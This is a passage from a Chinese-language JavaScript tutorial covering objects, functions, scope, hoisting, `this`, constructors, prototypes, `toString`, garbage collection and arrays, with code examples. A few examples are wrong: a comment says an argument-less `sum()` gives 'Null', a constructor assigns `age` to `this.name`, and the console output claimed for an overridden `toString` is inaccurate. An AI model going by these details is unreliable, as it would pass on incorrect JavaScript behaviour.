class="attr">gender</span>:<span class="string">&quot;男&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> n <span class="keyword">in</span> obj)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;属性名：&quot;</span>+n);<span class="comment">//name、age、gender</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;属性值：&quot;</span>+obj[n]);<span class="comment">//chenadian、18、男</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="基本数据类型和引用数据类型"><a href="#基本数据类型和引用数据类型" class="headerlink" title="基本数据类型和引用数据类型"></a>基本数据类型和引用数据类型</h1><ul><li>基本数据类型：<code>Number、String、Boolean、Null、Undefined</code></li><li>引用数据类型： <code>Object</code></li><li><code>JS中的变量</code>都是保存到<code>栈内存</code>中的</li><li><code>基本数据类型的值</code>直接在<code>栈内存</code>中储存</li><li><code>对象</code>是保存在<code>堆内存</code>中，每新建一个对象，就在堆内存中开辟一个新的空间<ul><li>而变量保存的是<code>对象的内存地址（对象的引用）</code>，如果两个变量保存的是同一个对象引用，</li><li>当一个变量改变时，另一个变量会受到影响。</li></ul></li><li>比较<code>两个基本数据类型</code>时，就是在比较两数据的<code>值</code> ，而<code>比较两对象</code>时，比较的是两对象的<code>内存地址</code>，<code>两对象</code>的<code>内容一样</code>，<code>地址不一样</code>会返回<code>false</code></li></ul><hr><h1 id="对象字面量"><a href="#对象字面量" class="headerlink" title="对象字面量"></a>对象字面量</h1><p><strong>使用字面量创建一个对象</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> obj);  <span class="comment">//object</span></span><br></pre></td></tr></table></figure><p>使用对象字面量，可以在创建对象时，直接指定对象中的属性<br>语法 ： <code>声明 对象名 = &#123;属性名:属性值，属性名:属性值…&#125;</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;chenadian&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>:<span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">name</span>);  <span class="comment">//chenadian</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">age</span>);  <span class="comment">//18</span></span><br></pre></td></tr></table></figure><hr><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>函数也是<code>对象</code></strong></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>语法：<br>function 函数名([形参1，形参2]){<br>    语句。。。。<br>}</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">showOne</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;声明了一个函数&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2><p>刚刚创建了一个函数showOne(),现在就可以调用，如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">showOne</span>();  <span class="comment">//警告框：声明了一个函数</span></span><br></pre></td></tr></table></figure><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>参数可称为<code>函数参数</code>，可以使用参数来将任意数据传递给函数</p><ul><li><p>形参 (形式参数)</p><ul><li>可以在函数的<code>括号()</code>中来指定一个或多个形参（形式参数）</li><li>多个形参之间使用（<code>,</code>）隔开，<code>声明形参</code>就是相当于在函数<code>内部声明对应的变量</code>，但<code>不赋值</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(x+y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">sum</span>();  <span class="comment">//Null</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>实参 (实际参数)</p><ul><li>在<code>调用函数</code>时，可以在函数的<code>括号()</code>里来指定实参(实际参数)</li><li><code>实参</code>将会<code>赋值</code>给函数对应的<code>形参</code></li><li><code>形参</code>和<code>实参</code>不会检查类型和数量</li><li>当<code>形参</code>过多时，建议把<code>形参</code>封装进<code>对象</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(x+y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">sum</span>(<span class="number">1</span>,<span class="string">&quot;asd&quot;</span>);  <span class="comment">//1asd</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p><code>return</code> 返回函数的值<br><code>return</code>后，<code>无法运行后面的代码</code><br><code>return</code>可以返回<code>任何数据类型</code><br>单写一个<code>return</code>返回<code>undefined</code><br>不写<code>return</code> 返回<code>undefined</code><br><code>return</code>可以加上判断 来结束整个函数运行</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">sum</span>(<span class="number">1</span>,<span class="string">&quot;asd&quot;</span>);   <span class="comment">// 1asd</span></span><br><span class="line"><span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>); <span class="comment">// 3</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>);<span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> a = x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>);<span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>在<code>调用</code>时，<code>创建</code><br>在<code>结束</code>时，<code>销毁</code><br>每次调用，都是<code>独立</code>的，<br>调用三次，便是创建销毁三次<br>在<code>函数中声明的变量</code>，只能在<code>函数内部中使用</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">showOne</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="string">&quot;内部的变量&quot;</span>;</span><br><span class="line">    <span class="title function_">alert</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">showOne</span>();  <span class="comment">//警告框：内部的变量</span></span><br><span class="line"><span class="title function_">alert</span>(a);   <span class="comment">//出错，无法调用局部的变量</span></span><br></pre></td></tr></table></figure><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>在<code>页面打开时创建</code>，在<code>页面关闭时销毁</code><br><code>全局变量</code>都会作为<code>window的属性</code>保存<br>在<code>函数内</code>可以<code>调用外部的变量</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">&quot;外部的变量&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showOne</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">showOne</span>();  <span class="comment">//警告框：外部的变量</span></span><br></pre></td></tr></table></figure><p>函数即可以调用<code>函数外部的变量</code>，也可以<code>改变外部的变量</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">&quot;外部的变量&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showOne</span>(<span class="params"></span>)&#123;</span><br><span class="line">    a = <span class="string">&quot;被修改后的外部变量&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">alert</span>(a);   <span class="comment">// a变量被改变前 警告窗：外部的变量</span></span><br><span class="line"><span class="title function_">showOne</span>();  <span class="comment">// 调用函数改变外部的变量</span></span><br><span class="line"><span class="title function_">alert</span>(a);   <span class="comment">// a变量被改变后 警告窗：被改变后的外部变量</span></span><br></pre></td></tr></table></figure><p>只有在<code>没有局部变量</code>的情况下，才会去<code>调用外部变量</code>,<br>如果<code>局部变量</code>和<code>外部变量同名</code>，<code>局部变量优先级</code>比<code>外部变量高</code>，会使用<code>局部变量</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">&quot;我是外部变量&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showOne</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="string">&quot;我是内部变量&quot;</span>;</span><br><span class="line">    <span class="title function_">alert</span>(a);</span><br><span class="line">    a = <span class="string">&quot;我是被修改后的局部变量&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">showOne</span>();  <span class="comment">// 我是内部变量</span></span><br><span class="line"><span class="title function_">alert</span>(a);   <span class="comment">//警告框：我是外部变量</span></span><br></pre></td></tr></table></figure><blockquote><p>全局变量</p><blockquote><p>任何<code>函数外</code>声明的变量，都称为<code>全局变量</code><br>任何<code>全局变量</code>在<code>任何函数</code>中都是<code>可见</code>的，除非<code>局部变量</code>和<code>全局变量同名</code>，<code>全局</code>就会<code>被遮蔽</code></p></blockquote></blockquote><blockquote><p>减少全局变量的使用是一种很好的做法。现在的代码有很少甚至没有全局变量。大多数变量存在于它们的函数中。但是有时候，全局变量能够用于存储项目级别的数据。</p></blockquote><h2 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h2><p>参数是可以带有<code>默认值</code>的<br>当没有给值传递给参数时，则得到<code>undefined</code><br>如上一个函数 showSum(); 来举例</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">showSum</span>(<span class="params">oneSrting,towString</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(oneSrting + <span class="string">&quot;,&quot;</span> + towString);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">showSum</span>(); <span class="comment">//警告窗： undefined,undefined</span></span><br></pre></td></tr></table></figure><p>所以可以给参数给个<code>默认值</code>,当<code>没值传递给参数</code>时，便<code>使用默认值</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">showSum</span>(<span class="params">oneSrting,towString = <span class="string">&quot;我是第二个参数&quot;</span></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(oneSrting + <span class="string">&quot;,&quot;</span> + towString);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">showSum</span>(<span class="string">&quot;我是第一个参数&quot;</span>); <span class="comment">// 警告窗: 我是第一个参数，我是第二个参数</span></span><br></pre></td></tr></table></figure><p>值是<code>从左到右</code>按顺序传递的</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">showSum</span>(<span class="params">oneSrting = <span class="string">&quot;我是第二个参数&quot;</span>,towString</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(oneSrting + <span class="string">&quot;,&quot;</span> + towString);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">showSum</span>(<span class="string">&quot;我是第一个参数&quot;</span>); <span class="comment">// 警告窗: 我是第一个参数，undefined</span></span><br></pre></td></tr></table></figure><h2 id="后备的默认参数"><a href="#后备的默认参数" class="headerlink" title="后备的默认参数"></a>后备的默认参数</h2><p>当没给参数默认值，又不想它返回<code>undefined</code><br>为了判断<code>参数</code>是否没用传递到值，我们可以拿它和<code>undefined</code>做比较</p><hr><h1 id="立即执行函数"><a href="#立即执行函数" class="headerlink" title="立即执行函数"></a>立即执行函数</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;我是一个匿名函数&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个<code>匿名函数</code>，但是这样<code>报错</code><br>因为<code>没有函数名</code>，不知道它是什么<br>所以可以加个<code>括号()</code> ，让程序知道是一个<code>整体</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;我是一个匿名函数&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>而执行只需要在后面再加一个<code>括号（）</code>即可</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;我是一个匿名函数&quot;</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>这样就会被<code>立即执行</code>，且<code>只运行一次</code>，<code>不占内存</code></p><hr><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><p><code>函数</code>也可以称为<code>对象的属性</code><br>如果一个<code>函数</code>作为一个<code>对象</code>的<code>属性</code>保存<br>那么就称这个<code>对象的方法</code><br><code>调用函数</code>就是<code>调用对象的方法</code><br><strong>调用方法和调用函数只是名字的区别</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">obj.<span class="property">name</span> = <span class="string">&quot;chenadian&quot;</span>;</span><br><span class="line">obj.<span class="property">fun</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(obj.<span class="property">name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fun2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(obj.<span class="property">name</span>);</span><br><span class="line">&#125;</span><br><span class="line">obj.<span class="title function_">fun</span>();<span class="comment">//调用方法</span></span><br><span class="line"><span class="title function_">fun2</span>();<span class="comment">//调用函数</span></span><br></pre></td></tr></table></figure><hr><h1 id="声明提前"><a href="#声明提前" class="headerlink" title="声明提前"></a>声明提前</h1><h2 id="变量声明提前"><a href="#变量声明提前" class="headerlink" title="变量声明提前"></a>变量声明提前</h2><p><code>var</code>关键字声明的变量，会在<code>代码执行之前被声明</code>，<br>如果不用<code>var</code>声明，则变量不会被声明提前</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(a); <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&quot;提前声明&quot;</span>;</span><br></pre></td></tr></table></figure><p>实际上，是这样运行的</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a </span><br><span class="line"><span class="title function_">alert</span>(a);</span><br><span class="line">a = <span class="string">&quot;提前声明&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="函数声明提前"><a href="#函数声明提前" class="headerlink" title="函数声明提前"></a>函数声明提前</h2><p><code>function</code>声明的函数会在<code>代码执行之前</code>，就先创建</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fun</span>();</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;提前声明&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上，是这样运行的</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;提前声明&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fun</span>();</span><br></pre></td></tr></table></figure><hr><h1 id="this"><a href="#this" class="headerlink" title="this"></a>this</h1><p>对象<code>方法</code>需要访问对象中<code>存储的信息</code>才能完成其工作。<br>如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">user.<span class="title function_">sayHi</span>();</span><br></pre></td></tr></table></figure><p>而 <code>this的值</code> 便是 <code>user</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="title function_">sayHi</span>();</span><br></pre></td></tr></table></figure><p><code>user</code>会变，而<code>this</code>则不会变</p><p><strong>总结：</strong></p><ul><li>当以<code>函数</code>的形式调用时，<code>this</code>是<code>window</code></li><li>当以<code>方法</code>的形式调用时，谁调用方法，this就是谁，即<code>当前对象</code></li><li>当以<code>构造函数</code>的形式调用时，this就是<code>新创建的那个对象</code></li></ul><hr><h1 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h1><p><code>构造函数</code>就是<code>普通的函数</code>，就是<code>调用方式不同</code><br>不同的是<code>构造函数</code>习惯上<code>首字母大写</code><br><code>普通函数</code>是<code>直接调用</code>，而<code>构造函数</code>需要使用<code>new关键字来调用</code></p><h2 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h2><ul><li>1.立即创建一个<code>新的对象</code></li><li>2.将<code>新建的对象</code>设置为函数中<code>this</code>，在<code>构造函数</code>中可以使用<code>this</code>来<code>引用新建的对象</code></li><li>3.<code>逐行</code>执行函数中的<code>代码</code></li><li>4.将<code>新建的对象</code>作为<code>返回值</code></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name , age ,gender</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = age;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gender</span> = gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> per = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;孙悟空&quot;</span>,<span class="number">18</span>,<span class="string">&quot;男&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>per</code>为 <code>Person构造函数</code> 的<code>实例</code><br><code>per</code> 为<code>实例</code><br><code>Person</code> 为<code>类/构造函数</code><br>使用同一个构造函数创建的对象，我们称为一类对象，也将一个<code>构造函数</code>称为一个<code>类</code>。<br>我们将通过一个<code>构造函数创建的对象</code>，称为是该<code>类的实例</code><br><code>构造函数</code>就是<code>类</code>，<code>实例</code>通过<code>构造函数</code>创建的<code>对象</code></p><h2 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h2><p>检查一个<code>对象</code>是否是一个<code>类的实例</code><br>语法： <code>对象 instanceof 构造函数</code><br>如果<code>是</code>，则<code>ture</code>，否则<code>false</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(per <span class="keyword">instanceof</span> <span class="title class_">Person</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>所有<code>对象</code>都是 <code>object</code> 的<code>对象</code> 即 返回 <code>true</code></p><h2 id="原型对象-prototype"><a href="#原型对象-prototype" class="headerlink" title="原型对象 prototype"></a>原型对象 prototype</h2><p>创建的每一个函数，解析器都会向函数中添加一个属性<code>prototype</code>，这个<code>属性</code>对应着一个<code>对象</code>，这个<code>对象</code>就是我们所谓的<code>原型对象</code><br>如果函数作为<code>普通函数</code>调用<code>prototype</code>没有任何作用,<br>当函数以<code>构造函数</code>的形式调用时，它所创建的<code>对象</code>中都会有一个<code>隐含的属性</code>， 指向该<code>构造函数</code>的<code>原型对象</code>，我们可以通过<code>__proto__</code>来访问该<code>属性</code><br><code>原型对象prototype</code>就相当于<code>类</code>的<code>公共的区域</code>，所有同一个<code>类</code>的<code>实例</code>都可以访问到这个<code>原型对象</code>， 我们可以将对象中<code>共有</code>的内容，统一设置到<code>原型对象</code>中。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name , age ,gender</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gender</span> = gender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> per1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;a1&quot;</span>,<span class="number">18</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> per2 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;a2&quot;</span>,<span class="number">19</span>,<span class="string">&quot;女&quot;</span>);</span><br><span class="line"><span class="comment">//向Person的原型中添加属性id</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">id</span> = <span class="string">&quot;我是公共空间里的&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(per1.<span class="property">id</span>); <span class="comment">//我是公共空间里的</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(per2.<span class="property">id</span>); <span class="comment">//我是公共空间里的</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(per1.<span class="property">__proto__</span> == <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br></pre></td></tr></table></figure><h3 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h3><p>访问<code>对象</code>的一个<code>属性</code>或<code>方法</code>时<br>先在<code>对象自身</code>里找<code>属性</code>， 有则直接使用<br>无则去<code>prototype</code>里面找</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>每个<code>构造函数</code>，即<code>类</code>在创建时，都有一个<code>隐藏属性prototype</code>，这个空间为<code>堆内存</code><br>而通过这个<code>类/构造函数</code>，创建的<code>实例</code>中的<code>栈内存</code>都有去指向这个<code>堆内存</code><br>即 <code>类与实例 公用的 堆内存</code> 便是 <code>prototype</code><br>在实例<code>自身</code>属性中<code>没找到的属性</code>，就会去<code>prototype</code>里面找</p><h3 id="in"><a href="#in" class="headerlink" title="in"></a>in</h3><p>检查<code>对象</code>中的<code>属性</code><br>使用<code>in</code>检查对象中是否含有某个属性时，<code>有</code>则<code>true</code> <code>无</code>则<code>false</code><br>但 <code>prototype</code> 里面的也会被检查</p><h3 id="hasOwnProperty-NaN"><a href="#hasOwnProperty-NaN" class="headerlink" title="hasOwnProperty"></a>hasOwnProperty</h3><p>检查<code>对象自身</code>中的<code>属性</code><br>使用<code>hasOwnProperty</code>检查对象中是否含有某个属性时，<code>有</code>则<code>true</code> <code>无</code>则<code>false</code><br>不过是在<code>自身</code>中找，不包括原型（<code>prototype</code>）</p><h3 id="原型对象-里面的-原型对象"><a href="#原型对象-里面的-原型对象" class="headerlink" title="原型对象 里面的 原型对象"></a>原型对象 里面的 原型对象</h3><p><code>原型对象</code>也是<code>对象</code>，所以也有<code>原型</code><br>当使用一个<code>对象的属性</code>或<code>方法</code>时，会在<code>自身</code>中寻找<br>如果<code>没有</code>则去<code>原型对象</code>中寻找，<br><code>原型对象</code>中没有，则去<code>原型对象</code>中的<code>原型对象</code>中找<br>直到找到<code>object对象</code>的<code>原型</code>，<br><code>Object对象</code>的<code>原型</code>没有<code>原型</code>，如果在Object原型中依然没有找到，<code>属性</code>则返回undefined<br><code>Object对象</code>的<code>原型</code>的值是<code>null</code><br><code>一般</code>就 <code>嵌套两个</code></p><hr><h1 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h1><p>当在页面打印一个<code>对象</code>时，实际上是输出<code>对象</code>的<code>toString</code>的<code>返回值</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name , age ,gender</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gender</span> = gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> per = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;chenadian&quot;</span>,<span class="number">20</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(per); <span class="comment">// object</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( per.<span class="title function_">toString</span>() ); <span class="comment">// object</span></span><br></pre></td></tr></table></figure><p><code>per</code>和<code>per.toString()</code>是一样的<br>而要输出属性，则修改<code>toString</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Person[name=&quot;</span>+<span class="variable language_">this</span>.<span class="property">name</span>+<span class="string">&quot;,age=&quot;</span>+<span class="variable language_">this</span>.<span class="property">age</span>+<span class="string">&quot;,gender=&quot;</span>+<span class="variable language_">this</span>.<span class="property">gender</span>+<span class="string">&quot;]&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(per); <span class="comment">// Person[name=chenadian，age=20，gender=男]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( per.<span class="title function_">toString</span>() ); <span class="comment">// Person[name=chenadian，age=20，gender=男]</span></span><br></pre></td></tr></table></figure><hr><h1 id="垃圾回收-GC"><a href="#垃圾回收-GC" class="headerlink" title="垃圾回收(GC)"></a>垃圾回收(GC)</h1><p><code>程序运行</code>就会产生<code>垃圾</code>，<br>占用大量<code>内存空间</code>，程序运行<code>变慢</code><br>内存<code>溢出</code>，程序<code>瘫痪</code><br>而<code>js</code>有<code>自动回收机制</code><br>我们只需要<code>断开``栈内存</code>与<code>堆内存</code>的连接<br>让浏览器等编译器知道可以回收即可，<code>对象</code>设置<code>null</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name , age ,gender</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gender</span> = gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> per = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;chenadian&quot;</span>,<span class="number">20</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line">per = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><hr><h1 id="数组（Array）"><a href="#数组（Array）" class="headerlink" title="数组（Array）"></a>数组（Array）</h1><p>数组也是<code>对象</code>，但<code>不是普通对象</code>，<br><code>普通对象</code>使用<code>字符</code>作为<code>属性名</code><br><code>数组对象</code>使用<code>数字</code>作为<code>索引（下标）</code><br><code>数组</code>可以放<code>任何数据类型</code>，<br>包括<code>对象 、函数、数组</code></p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="索引（下标）"><a href="#索引（下标）" class="headerlink" title="索引（下标）"></a>索引（下标）</h3><p><code>从0开始的整数</code>就是<code>索引</code></p><h3 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h3><p>数组的<code>存储性能</code>比普通对象要<code>好</code></p><h3 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h3><ul><li>构造函数创建<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> arr); <span class="comment">//object</span></span><br></pre></td></tr></table></figure></li><li>字面量创建<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> arr); <span class="comment">//object</span></span><br></pre></td></tr></table></figure></li><li>数组添加元素<br>语法： <code>数组[索引] = 值</code><br>读取<code>不存在</code>的<code>索引</code>，返回<code>undefined</code><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">123</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="number">456</span>;</span><br><span class="line">arr[<span class="number">2</span>] = <span class="number">789</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr[<span class="number">0</span>]); <span class="comment">//123</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title 